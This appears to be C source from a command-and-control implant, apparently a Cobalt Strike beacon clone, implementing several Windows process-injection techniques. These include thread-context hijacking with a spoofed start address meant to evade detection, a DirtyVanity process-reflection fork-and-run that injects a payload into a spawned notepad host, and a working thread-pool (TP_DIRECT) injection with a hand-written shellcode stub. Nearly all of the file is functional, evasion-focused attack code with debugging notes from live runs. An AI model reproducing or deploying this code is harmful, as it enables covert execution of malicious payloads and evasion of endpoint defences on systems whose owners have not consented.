/*
 * Tier-2 item 7 (4.11/4.12 injection-technique family):
 *
 *  - PI_EXEC_OBFSETTHREADCONTEXT (0x09): CreateRemoteThread(suspended) with
 *    the thread start address set to the target's own image entry point,
 *    then SetThreadContext to the payload. The kernel-recorded StartAddress
 *    stays a legitimate image entry, which is the whole point of the 4.11
 *    default technique (defeats Get-InjectedThreadEx-style start-address
 *    checks). x64 -> x64 only.
 *
 *  - PI_EXEC_DIRTYVANITY (0x0A): fork&run through RtlCloneUserProcess - the
 *    patsy is a CLONE of our own host process (identical, legitimate image)
 *    instead of a freshly spawned binary. x64 only. Applied at the spawn
 *    sites (command_inject / command_job_spawn_logic), not in the execute
 *    chain itself, because it replaces the patsy rather than the trigger.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "syscalls.h"
#include "spawn_trace.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
typedef NTSTATUS(NTAPI *fRtlCloneUserProcess)(ULONG, void *, HANDLE *, HANDLE *);
typedef NTSTATUS(NTAPI *fNtQueryInformationProcess)(HANDLE, ULONG, void *, ULONG, ULONG *);

/* minimal winternl shape (avoid header dependencies) */
typedef struct _T2_PBI {
	void     * Reserved1;
	void     * PebBaseAddress;
	void     * Reserved2[2];
	ULONG_PTR  UniqueProcessId;
	void     * Reserved3;
} T2_PROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define CLONE_PROCESS_FLAGS     0x00000001

/* walk the remote process's PEB to its EXE entry point (x64 layouts) */
static void * remote_exe_entry_x64(HANDLE hProcess) {
	fNtQueryInformationProcess pQIP;
	unsigned char              peb[0x20];
	unsigned char              dos[0x40];
	unsigned char              nth[0x60];
	void                     * pebaddr = NULL;
	unsigned long long         imagebase = 0;
	unsigned long              e_lfanew = 0;
	unsigned long             * aoep;
	SIZE_T                     got = 0;
	T2_PROCESS_BASIC_INFORMATION pbi;

	pQIP = (fNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQIP == NULL) {
		return NULL;
	}

	ZeroMemory(&pbi, sizeof(pbi));
	if (pQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0 || pbi.PebBaseAddress == NULL) {
		return NULL;
	}

	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		spawn_log("obf: walk FAIL read imagebase gle=", (long)GetLastError());
		return NULL;
	}
	spawn_log("obf: walk imagebase=", (long)(long long)imagebase);

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		spawn_log("obf: walk FAIL read dos gle=", (long)GetLastError());
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		spawn_log("obf: walk FAIL no MZ (stomped headers?)", 0x7fffffff);
		return NULL;
	}

	e_lfanew = *(unsigned long *)(dos + 0x3c);
	if (e_lfanew == 0 || e_lfanew > 0x400) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase + e_lfanew, nth, 0x60, &got) || got != 0x60) {
		return NULL;
	}

	if (nth[0] != 'P' || nth[1] != 'E') {
		return NULL;
	}

	/* OptionalHeader starts at NT headers + 0x18; AddressOfEntryPoint at +0x10 */
	aoep = (unsigned long *)(nth + 0x18 + 0x10);
	return (void *)(DWORD_PTR)((unsigned char *)(DWORD_PTR)imagebase + *aoep);
}

/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	spawn_log("obf: chain entry pid=", (long)context->pid);

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		spawn_log("obf: FAIL arch mismatch", 0x7fffffff);
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		spawn_log("obf: FAIL suspended target", 0x7fffffff);
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
		return FALSE;
	}
	spawn_log("obf: legit entry=", (long)(long long)legit);

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
		return FALSE;
	}
	spawn_log("obf: CRT ok thread=", (long)(long long)hThread);

	ZeroMemory(&c, sizeof(c));
	c.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}
	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);

	/* route the thread through ntdll!RtlUserThreadStart instead of
	 * jumping straight to the payload: a thread whose context skips the
	 * ntdll bootstrap runs without the GS cookie / TLS / activation
	 * frame setup and dies on its first fault silently (live: inject
	 * into a running host reported execute-ok yet no session ever
	 * checked in). RtlUserThreadStart(StartAddress, Parameter) - the
	 * kernel-recorded StartAddress keeps pointing at the legitimate
	 * image entry from CreateRemoteThread. */
	{
		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
		if (ustart == NULL) {
			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
		c.Rcx = (DWORD64)lpStartAddress;
		c.Rdx = (DWORD64)lpParameter;
		c.Rip = (DWORD64)ustart;
	}

	if (!SetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
	return TRUE;
#endif
}

/* does the configured process-inject execute chain contain this opcode? */
BOOL procinj_execute_has(BYTE opcode) {
	char * options = setting_ptr(SETTING_PROCINJ_EXECUTE);
	datap  parser;
	DWORD  op;

	if (options == NULL) {
		return FALSE;
	}

	data_init(&parser, options, 128);

	while (TRUE) {
		op = data_byte(&parser);

		if (op == PI_EXEC_FAIL) {
			return FALSE;
		}

		if (op == opcode) {
			return TRUE;
		}

		/* skip opcode-specific payloads */
		if (op == PI_EXEC_CREATETHREAD_F || op == PI_EXEC_CREATEREMOTETHREAD_F) {
			data_short(&parser);
			data_string_asciiz(&parser);
			data_string_asciiz(&parser);
		}
	}
}

/* 4.12 DirtyVanity fork&run via RtlCreateProcessReflection. The original
 * implementation called the raw ntdll!RtlCloneUserProcess primitive and
 * then ran the normal execute chain inside the clone - but a raw clone
 * lacks the loader bootstrap state a real process start gets, so every
 * thread we minted in it AV'd inside ntdll during init (live: memset
 * movaps at ntdll+0xa4778, deterministic) and calling the raw primitive
 * from a managed host deadlocks outright (reproduced with ctypes/csc
 * probes). The official DirtyVanity contract is the reflection API: it
 * clones the target AND launches the clone's initial thread AT
 * StartAddress, so the payload must simply live in the forked address
 * space before the fork. New shape: inject_dirtyvanity_forkrun points
 * the whole inject pipeline at OUR OWN process (local mirror + profile
 * transforms), and the DirtyVanity opcode in the execute chain triggers
 * the reflection - the clone inherits the mirrored payload and its very
 * first thread runs it. Identical image to us, kernel-recorded start
 * address inside that image: the whole point of the technique. */
typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
	void * ReflectionProcessHandle; /* live-probed layout: process handle,
	                                  * thread handle, then CLIENT_ID. The
	                                  * phnt thread-handle-first order parses
	                                  * the thread handle as the pid and the
	                                  * spawn-side OpenProcess fails with
	                                  * ERROR_INVALID_PARAMETER (gle 87). */
	void * ReflectionThreadHandle;
	void * UniqueProcess;
	void * UniqueThread;
} T2_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);

/* ---- fork&run nursery ------------------------------------------------
 * A reflection clone of a beacon that has already run HTTP inherits the
 * live wininet/RPC state; the payload beacon inside the clone dies with a
 * fastfail in RPCRT4 on its first checkin (live, twice). Forking instead
 * at beacon() boot - before any RPC-capable subsystem is touched - gives
 * a pristine clone. The clone's initial thread parks on the mailbox (an
 * inherited copy at the identical VA); the spawn path later writes the
 * payload plus mailbox directly into the parked clone and it jumps. No
 * remote threads, no inherited-runtime poisoning, identical image. */
typedef struct {
	volatile LONG go;
	volatile LONG magic;  /* parent stamps DV_MAGIC when it fills the mailbox;
	                       * the clone CLEARS it as its very first action after
	                       * the go-flip. The parent only trusts `stage` once
	                       * magic is gone - the previous code read an
	                       * UNINITIALIZED stack DV_MAILBOX (mb.stage carried
	                       * whatever the stack held, e.g. 679), wrote that
	                       * garbage into the clone and then its probe loop
	                       * (stage >= 20) reported the junk as launcher
	                       * progress and bailed out after one poll. */
	DWORD  host_pid;  /* suspended host pre-created by the healthy parent.
	                   * PID, not handle: the fork's handle-table copy does
	                   * not guarantee value stability, a PID is process-
	                   * global; the clone re-opens it with a raw
	                   * NtOpenProcess */
	char * payload;   /* dll bytes already mirrored into the clone (RX) */
	int    plen;
	void * param;     /* parameter blob already mirrored (RW) */
	int    plen_arg;
	volatile LONG stage;  /* trampoline progress: the parent reads this
	                       * copy back through the clone handle */
	volatile LONG last_st;/* NTSTATUS of the failing call, if any */
} DV_MAILBOX;

#define DV_MAGIC 0x44564D42 /* 'DVMB' */

static DV_MAILBOX dv_mailbox = { 0, 0, 0, NULL, 0, NULL, 0, 0, 0 };
static HANDLE dv_clone_handle = NULL;
static DWORD  dv_clone_pid = 0;
static DWORD  dv_host_pid = 0;

/* runs INSIDE the clone. The cloned user-mode runtime is a torn snapshot
 * (heap locks, FLS, RPC bindings mid-flight): a full beacon payload dies
 * in RPCRT4 on its first RPC touch and even CreateProcessA faults in
 * KERNELBASE (both observed live). The launch therefore touches NOTHING
 * user-mode: the host process was pre-created by the healthy PARENT at
 * boot, its handle inherited through the fork, and every operation here
 * routes through the raw-syscall gate wrappers (stubs resolved in the
 * parent and inherited with the address space; the profile's syscall
 * method selects them). The new session comes from the healthy host
 * while every injection record inside the clone points at our own
 * legitimate image - the DirtyVanity contract. */
static void dv_clone_launch(DWORD host_pid, char * payload, int plen, void * param, int plen_arg) {
	void * remote;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD  oldp = 0;
	HANDLE host;
	HANDLE ht;

	/* consume handshake: the parent's probe only trusts `stage` once the
	 * magic is gone (see the DV_MAILBOX comment) */
	dv_mailbox.magic = 0;

	if (host_pid == 0) {
		dv_mailbox.stage = 2;
		return;
	}
	dv_mailbox.stage = 10; /* woke */

	/* PROCESS_VM_OPERATION | VM_WRITE | VM_READ | CREATE_THREAD | QUERY */
	host = beacon_OpenProcess(0x1F0FFF, FALSE, host_pid);
	if (host == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 20;
		return;
	}
	dv_mailbox.stage = 21;

	remote = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen,
	                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 30;
		return;
	}
	dv_mailbox.stage = 31;

	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 40;
		return;
	}
	dv_mailbox.stage = 41;

	beacon_VirtualProtectEx(host, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
	dv_mailbox.stage = 50;

	if (plen_arg > 0) {
		rparam = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen_arg,
		                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam != NULL) {
			beacon_WriteProcessMemory(host, rparam, param, (SIZE_T)plen_arg, &got);
			dv_mailbox.stage = 51;
		}
	}

	ht = beacon_CreateRemoteThread(host, NULL, 0, (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
	if (ht == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 60;
		return;
	}
	CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
	dv_mailbox.stage = 99; /* launched */
}

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	dv_clone_launch(dv_mailbox.host_pid, dv_mailbox.payload, dv_mailbox.plen,
	                dv_mailbox.param, dv_mailbox.plen_arg);
	for (;;)
		Sleep(60000);
}

void dv_nursery_init(void) {
	fRtlCreateProcessReflection pReflect;
	T2_REFLECTION_INFORMATION info;
	HMODULE nt;
	DWORD pid;

	if (dv_clone_pid != 0)
		return;
	if (!procinj_execute_has(PI_EXEC_DIRTYVANITY))
		return; /* profile does not want fork&run */

	nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return;
	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
	if (pReflect == NULL)
		return;

	/* pre-create the suspended launch host NOW, from the healthy parent:
	 * the clone's torn runtime cannot even CreateProcessA (live: AV in
	 * KERNELBASE), so the host must exist before the fork - its handle
	 * rides into the clone through INHERIT_HANDLES (copied 1:1).
	 *
	 * The host must ALSO be a RUNNING, loader-initialized process: a
	 * CREATE_SUSPENDED process never runs LdrpInitialize, so its MRDATA
	 * heap (ntdll's dynamic function-table store) does not exist and the
	 * payload's RL dies inside RtlAddFunctionTable ->
	 * LdrEnsureMrdataHeapExists (live WER: rundll32.exe AV in ntdll
	 * +0x691c6, 2026-11-05). notepad is fully initialized, stays alive
	 * on its own, and matches the sacrificial-host convention the
	 * injection family tests already use. */
	{
		STARTUPINFOA        si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE,
		                    0, NULL, NULL, &si, &pi)) {
			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
			return;
		}
		dv_mailbox.host_pid = pi.dwProcessId;
		dv_host_pid       = pi.dwProcessId;
		/* the clone re-opens the host by PID (NtOpenProcess); the parent
		 * needs no handle. The host lives on as the beacon's home. */
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	/* the raw-syscall stubs must be resolved in the healthy parent so the
	 * inherited copies are ready inside the clone */
	syscalls_resolve();

	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
	ZeroMemory(&info, sizeof(info));
	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
		spawn_log("dv: nursery reflect failed", 0x7fffffff);
		return;
	}

	dv_clone_handle = info.ReflectionProcessHandle;
	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
	if (dv_clone_handle == NULL || pid == 0 || pid == GetCurrentProcessId()) {
		spawn_log("dv: nursery layout mismatch? pid=", (long)pid);
		dv_clone_handle = NULL;
		return;
	}
	dv_clone_pid = pid;
	spawn_log("dv: nursery up, clone pid=", (long)pid);
	spawn_log("dv: host pid=", (long)dv_host_pid);
}

BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parameter, int plen) {
#if !defined _M_X64
	return FALSE;
#else
	/* deliver the payload into the parked nursery clone: mirror the dll
	 * RX, mirror the parameter RW, flip the mailbox. The trampoline jumps
	 * to the payload entry (offset 0, the spawn convention). Profile
	 * transforms are not applied on this path. One-shot: the clone runs
	 * the payload beacon from here on. */
	void * remote = NULL;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD oldp = 0;
	HANDLE hc;
	DV_MAILBOX mb;

	if (dv_clone_pid == 0 || dv_clone_handle == NULL)
		return FALSE;

	/* the reflection information carries a process handle already valid
	 * in our context - no OpenProcess round trip needed */
	hc = dv_clone_handle;

	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
		spawn_log("dv: payload write failed gle=", (long)GetLastError());
		return FALSE;
	}
	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);

	if (plen > 0) {
		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
			spawn_log("dv: param write failed gle=", (long)GetLastError());
			return FALSE;
		}
	}

	/* FILL THE WHOLE STRUCT: the old code left stage/last_st as stack
	 * garbage and wrote them into the clone, and the probe loop then read
	 * that junk back as "progress" (the observed stage=679). */
	ZeroMemory(&mb, sizeof(mb));
	mb.magic    = DV_MAGIC;
	mb.go       = 0; /* flipped in a second write below */
	mb.host_pid = dv_host_pid;
	mb.payload  = (char *)remote; /* the clone launches the payload at its
	                               * base (offset-0 convention); job-style
	                               * offsets are not routed through the
	                               * nursery - the patsy path keeps those */
	mb.plen     = dllen;
	mb.param    = rparam;
	mb.plen_arg = plen;
	/* dv_mailbox lives in our image - the clone's inherited copy sits at
	 * the identical VA (fork preserves the address space).
	 * Two-phase write: every field lands while go is still 0, then go is
	 * flipped on its own - the clone cannot wake up on a half-written
	 * mailbox (go used to be the FIRST byte of a single torn write). */
	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
		return FALSE;
	}
	{
		LONG go = 1;
		if (!WriteProcessMemory(hc, &dv_mailbox, &go, sizeof(go), &got) || got != sizeof(go)) {
			spawn_log("dv: mailbox go flip failed gle=", (long)GetLastError());
			return FALSE;
		}
	}

	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);

	/* read the trampoline's progress back through the clone handle (its
	 * mailbox copy carries the stage) - the launcher is otherwise mute.
	 * Only a mailbox whose magic is GONE has been consumed by the clone;
	 * until then `stage` is the value *we* wrote (0). */
	{
		int i;
		LONG last_stage = -1;
		LONG still_magic = 0;
		for (i = 0; i < 20; i++) {
			DV_MAILBOX probe;
			SIZE_T got2 = 0;
			Sleep(150);
			if (beacon_ReadProcessMemory(hc, &dv_mailbox, &probe, sizeof(probe), &got2) && got2 == sizeof(probe)) {
				still_magic = probe.magic;
				if (probe.magic == DV_MAGIC) {
					continue; /* clone has not consumed the mailbox yet */
				}
				last_stage = probe.stage;
				if (probe.stage >= 20) { /* 20/21/30/31/40/41/50/51/60/99 */
					spawn_log("dv: launcher stage=", (long)probe.stage);
					if (probe.stage < 99)
						spawn_log("dv: launcher last_st=", (long)probe.last_st);
					break;
				}
			}
		}
		if (i == 20) {
			/* loop exhausted: the clone never reported a terminal stage */
			spawn_log("dv: probe exhausted magic=", (long)still_magic);
			spawn_log("dv: probe exhausted stage=", (long)last_stage);
		}
	}

	dv_clone_pid = 0; /* one-shot: the handle stays for nothing further */
	return TRUE;
#endif
}


/* ===================== 4.12 injection overhaul scaffolds =====================
 * Contracts extracted 2026-11-09 from the primary research (full mechanics in
 * the repo's docs/INJECTION-412.md; see also ts docs/OFFICIAL-COMPAT-LEDGER
 * C-17). These slots exist so the profile-facing execute chain and the TS
 * opcode packing (ProcessInject.java 11/12/13) are complete; each body is an
 * availability-gated DECLINE until its research-grade core is implemented:
 *
 *   PI_EXEC_TPDIRECT (0xB) - SafeBreach "Process Injection Using Windows
 *     Thread Pools" variant 7: forge a TP_DIRECT whose Callback points at
 *     the payload and queue it onto the target pool's I/O completion port
 *     with NtSetIoCompletion. Needs: TP_POOL->IOCP handle leak via
 *     NtQueryInformationWorkerFactory + undocumented TP_DIRECT offsets.
 *
 *   PI_EXEC_TPSTARTROUTINESTUB (0xC) - same research, worker start-routine
 *     stub: the spawned worker's start address resolves to a legitimate
 *     ntdll threadpool entry while a crafted work structure dispatches to
 *     the payload. Needs: Tpp* entry resolution + work-struct layout.
 *
 *   PI_EXEC_EARLYCASCADE (0xD) - Outflank EarlyCascade: in a
 *     CREATE_SUSPENDED child, overwrite ntdll's g_pfnSE_DllLoaded (.mrdata,
 *     writable only while suspended) with a stub + set g_ShimsEnabled=1;
 *     the stub zeroes the flag and NtQueueApcThread's the payload onto the
 *     initial thread so NtTestAlert drains it at the end of
 *     LdrInitializeThunk. Needs: per-build signature scan for the two
 *     ntdll globals (derive from LdrpSendPostSnapNotifications disasm) and
 *     a position-independent stub. Fork&run only (enforced at dispatch).
 */

#if defined(_M_X64)
BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	/* SafeBreach "Process Injection Using Windows Thread Pools" variant 7 -
	 * CLOSED empirically 2026-11-13 (tools/tpd_harness.py, 3/3 exit 0x1337):
	 * the target pool's IOCP dequeues a completion whose KeyContext is our
	 * forged TP_DIRECT and TpDirectCallback calls the Callback field, which
	 * on Win10 19044 x64 sits at +0x38 (0x08/0x10/0x18 fast-fail the pool
	 * with 0xC0000409, 0x40 lands on the adjacent field -> 0xC0000005).
	 * No thread-creation primitive is used anywhere - the dequeuing worker
	 * is the target's own pool thread.
	 *
	 * Chain:
	 *   1. fork&run: resume the suspended patsy and give init a moment -
	 *      the thread pool does not exist before LdrInitializeThunk lands
	 *   2. VirtualAllocEx the 0x60-byte TP_DIRECT {RefCount=1,
	 *      Callback@0x38 = lpStartAddress}
	 *   3. walk the target handle table (SystemExtendedHandleInformation),
	 *      DuplicateHandle every handle into us and NtSetIoCompletion each
	 *      with our direct pointer as KeyContext. The kernel rejects every
	 *      non-IOCP object (0xC0000024); the pool's IOCP accepts and fires.
	 *
	 * Note: TpDirectCallback invokes Callback(direct, ...) - the thread
	 * parameter does NOT ride through (same limitation as the official
	 * technique; self-locating PIC payloads and our asyncdll, which reads
	 * its arguments from the patched __POSTEX_USER_ARGS__ buffer, work;
	 * kit DLLs that read lpReserved do not). */
	typedef NTSTATUS(WINAPI * NTSETIOCOMPLETION)(HANDLE, PVOID, PVOID, PVOID, PVOID);
	typedef NTSTATUS(WINAPI * NTQUERYSYSINFO)(ULONG, PVOID, ULONG, PULONG);

	HMODULE nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	NTSETIOCOMPLETION pSetIo = (NTSETIOCOMPLETION)GetProcAddress(nt, "NtSetIoCompletion");
	NTQUERYSYSINFO pQuerySys = (NTQUERYSYSINFO)GetProcAddress(nt, "NtQuerySystemInformation");
	if (pSetIo == NULL || pQuerySys == NULL) {
		spawn_log("tpdirect: ntdll apis missing", 0x7fffffff);
		return FALSE;
	}

	/* 1. fork&run needs a live pool */
	if (context->isSuspended && context->hThread != NULL) {
		if (ResumeThread(context->hThread) == (DWORD)-1) {
			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
			return FALSE;
		}
		Sleep(2000);
		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
	}

	HANDLE hProcess = context->hProcess;
	DWORD pid = context->pid;

	/* 2. TP_DIRECT + arg-forwarding stub. TpDirectCallback invokes
	 * Callback(direct, ...) - the stage entry would see the direct pointer
	 * instead of its real argument. Fields +0x40/+0x48 are not touched by
	 * the dispatch path, so stash payload/param there and point Callback at
	 * a 13-byte stub: rax=[rcx+0x40]; rcx=[rcx+0x48]; jmp rax. */
	unsigned char stubc[] = {
		0x48, 0x8B, 0x41, 0x40,             /* mov rax, [rcx+0x40] payload  */
		0x48, 0x8B, 0x49, 0x48,             /* mov rcx, [rcx+0x48] param    */
		0xFF, 0xE0                          /* jmp rax                      */
	};
	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
	 * PAGE_EXECUTE_READ at allocation time (C-25 live: gle=183 on the stub
	 * alloc; same EC-era fix pattern) */
	/* full-page request: the syscall alloc layer randomizes bases and a
	 * 13-byte request collides (C-25 live: gle=183 ERROR_ALREADY_EXISTS) */
	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x1000,
	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (stub == NULL) {
		spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
		return FALSE;
	}
	SIZE_T sgot = 0;
	if (!beacon_WriteProcessMemory(hProcess, stub, stubc, sizeof(stubc), &sgot) || sgot != sizeof(stubc)) {
		spawn_log("tpdirect: stub write failed gle=", (long)GetLastError());
		return FALSE;
	}
	{
		DWORD sold = 0;
		if (!beacon_VirtualProtectEx(hProcess, stub, sizeof(stubc), PAGE_EXECUTE_READ, &sold)) {
			spawn_log("tpdirect: stub protect failed gle=", (long)GetLastError());
			return FALSE;
		}
	}
	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (direct == NULL) {
		spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
		return FALSE;
	}
	{
		unsigned char buf[0x60];
		memset(buf, 0, sizeof(buf));
		*(unsigned int *)(buf + 0x00) = 1;                                   /* RefCount */
		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)stub;
		*(unsigned long long *)(buf + 0x40) = (unsigned long long)(size_t)lpStartAddress;
		*(unsigned long long *)(buf + 0x48) = (unsigned long long)(size_t)lpParameter;
		SIZE_T got = 0;
		if (!beacon_WriteProcessMemory(hProcess, direct, buf, sizeof(buf), &got) || got != sizeof(buf)) {
			spawn_log("tpdirect: direct write failed gle=", (long)GetLastError());
			return FALSE;
		}
	}
	spawn_log("tpdirect: direct armed=", (long)(long long)(size_t)direct);

	/* 3. handle-table walk + post */
	ULONG len = 0x100000;
	unsigned char * hbuf = (unsigned char *)malloc(len);
	if (hbuf == NULL)
		return FALSE;
	NTSTATUS st;
	int tries = 0;
	spawn_log("tpdirect: walk begin len=", (long)len);
	while (TRUE) {
		ULONG need = 0;
		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &need);
		spawn_log("tpdirect: walk try st=", (long)st);
		if (st == 0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) {
			if (++tries > 8 || need == 0 || need > 0x8000000) {
				spawn_log("tpdirect: walk bound exit need=", (long)need);
				free(hbuf);
				return FALSE;
			}
			unsigned char * nb = (unsigned char *)realloc(hbuf, need);
			if (nb == NULL) {
				free(hbuf);
				return FALSE;
			}
			hbuf = nb;
			len = need;
			continue;
		}
		break;
	}
	if (st != 0) {
		spawn_log("tpdirect: handle walk failed st=", (long)st);
		free(hbuf);
		return FALSE;
	}

	ULONG_PTR count = *(ULONG_PTR *)hbuf;
	ULONG_PTR posted = 0, accepted = 0;
	unsigned char * row = hbuf + 16; /* header: count(8) + pad(8) */
	HANDLE me = GetCurrentProcess();
	for (ULONG_PTR i = 0; i < count; i++, row += 40) {
		ULONG_PTR hpid = *(ULONG_PTR *)(row + 8);
		ULONG_PTR hval = *(ULONG_PTR *)(row + 16);
		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
			continue;
		HANDLE dup = NULL;
		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
			continue;
		posted++;
		NTSTATUS s2 = pSetIo(dup, direct, NULL, NULL, NULL);
		CloseHandle(dup);
		if (s2 == 0) {
			accepted++;
		}
	}
	free(hbuf);
	spawn_log("tpdirect: posted=", (long)posted);
	spawn_log("tpdirect: accepted iocp=", (long)accepted);
	if (accepted == 0) {
		spawn_log("tpdirect: no pool iocp accepted", 0x7fffffff);
		return FALSE;
	}

	/* the pool dequeues asynchronously; our caller treats TRUE as injected */
	Sleep(500);
	spawn_log("tpdirect: armed and queued", 0x7fffffff);
	return TRUE;
}

BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	(void)context; (void)lpStartAddress; (void)lpParameter;
	spawn_log("tpstartstub: scaffold decline (research pending)", 0x7fffffff);
	return FALSE;
}

/* implementation lives in src/earlycascade.cpp (4.12 EarlyCascade) */
BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter);
#endif
